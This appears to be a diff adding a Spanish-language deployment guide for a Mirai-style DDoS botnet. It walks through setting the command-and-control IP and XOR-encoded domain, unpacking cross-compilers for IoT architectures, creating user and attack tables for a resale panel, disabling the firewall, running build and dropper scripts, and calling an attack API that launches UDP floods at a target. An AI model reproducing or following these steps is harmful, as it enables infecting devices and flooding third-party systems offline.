@@ -1,0 +1,109 @@
+Requisito
+ubuntu 20.04 
+
+sudo apt-get update -y
+sudo apt-get upgrade -y
+sudo apt-get install gcc g++ python3 python3-pip electric-fence sudo git nginx screen tftpd tftp xinetd zmap mariadb-server sqlite3 -y
+
+//Descarga la version mas reciente de Golang
+
+cd /tmp
+wget https://dl.google.com/go/go1.20.linux-amd64.tar.gz
+sha256sum go1.20.linux-amd64.tar.gz
+sudo tar -C /usr/local -xzf go1.20.linux-amd64.tar.gz
+export PATH=$PATH:/usr/local/go/bin
+export GOROOT=/usr/local/go
+export GOPATH=$HOME/Projects/Proj1
+export PATH=$GOPATH/bin:$GOROOT/bin:$PATH
+export GOROOT=/usr/local/go; export GOPATH=$HOME/Projects/Proj1; export PATH=$GOPATH/bin:$GOROOT/bin:$PATH; go get github.com/go-sql-driver/mysql; go get github.com/mattn/go-shellwords
+source ~/.bash_profile
+go version
+go env
+cd ~/
+
+// Cambia la IP por la de tu VPS en :
+
+dlr/main.c
+loader/src/main.c
+loader/src/headers/config.h
+
+// Agregar Dominio
+//Arrastra el archivo xor.c a tu VPS y ejecuta
+
+gcc xor.c -o xor
+./xor string (Dominio)
+
+Agrega el arreglo de bytes en 
+
+TABLE_CNC_DOMAIN en el archivo table.c
+
+add_entry(TABLE_CNC_DOMAIN, "arreglo de bytes", numero entero de bytes);
+
+
+mkdir /etc/xcompile
+cd /etc/xcompile
+
+tar -jxf cross-compiler-i586.tar.bz2
+tar -jxf cross-compiler-m68k.tar.bz2
+tar -jxf cross-compiler-mips.tar.bz2
+tar -jxf cross-compiler-mipsel.tar.bz2
+tar -jxf cross-compiler-powerpc.tar.bz2
+tar -jxf cross-compiler-sh4.tar.bz2
+tar -jxf cross-compiler-sparc.tar.bz2
+tar -jxf cross-compiler-armv4l.tar.bz2
+tar -jxf cross-compiler-armv5l.tar.bz2
+tar -jxf cross-compiler-armv6l.tar.bz2
+tar -jxf cross-compiler-armv7l.tar.bz2
+tar -jxf cross-compiler-x86_64.tar.bz2
+rm -rf *.tar.*
+mv cross-compiler-i586 i586
+mv cross-compiler-m68k m68k
+mv cross-compiler-mips mips
+mv cross-compiler-mipsel mipsel
+mv cross-compiler-powerpc powerpc
+mv cross-compiler-sh4 sh4
+mv cross-compiler-sparc sparc
+mv cross-compiler-armv4l armv4l
+mv cross-compiler-armv5l armv5l
+mv cross-compiler-armv6l armv6l
+mv cross-compiler-armv7l armv7l
+mv cross-compiler-x86_64 x86_64
+
+// Instalaql
+
+sqlite3 data.sql
+
+CREATE TABLE `users` (`id` INTEGER PRIMARY KEY AUTOINCREMENT,`username` TEXT NOT NULL,`password` TEXT NOT NULL,`admin` INTEGER NOT NULL,`reseller` INTEGER NOT NULL,`newuser` INTEGER NOT NULL,`api` INTEGER NOT NULL,`maxtime` INTEGER NOT NULL,`cooldown` INTEGER NOT NULL,`conns` INTEGER NOT NULL,`max_daily` INTEGER NOT NULL,`expiry` INTEGER NOT NULL);
+
+INSERT INTO users VALUES(1,'root','c3r3z47746',1,1,0,0,864000,0,3,100,1790903892);
+
+CREATE TABLE `attacks` (`target` TEXT NOT NULL,`duration` INTEGER NOT NULL,`flags` TEXT NOT NULL,`sent` INTEGER NOT NULL,`finish` INTEGER NOT NULL,`user` TEXT NOT NULL,`devices` INTEGER NOT NULL);
+
+.databases
+
+# Arrastra data.sql ala carpeta Assets . si data.sql existe ya remplazala
+
+//Ejecuta
+
+service firewalld stop
+service iptables stop 
+service nginx restart
+service mariadb restart
+
+cd ~/
+chmod 777 *
+bash build.sh
+ulimit -n999999; ulimit -u999999; ulimit -e999999
+
+cd ~/
+chmod 777 *
+bash dropper.sh
+ulimit -n999999; ulimit -u999999; ulimit -e999999
+
+screen ./admin
+
+ api: http://ip:81/attack?user=root&password=root@123&target=1.1.1.1&duration=60&method=udpthread
+
+- Cambia el  bot port y cnc port en assets/server.toml
+
+
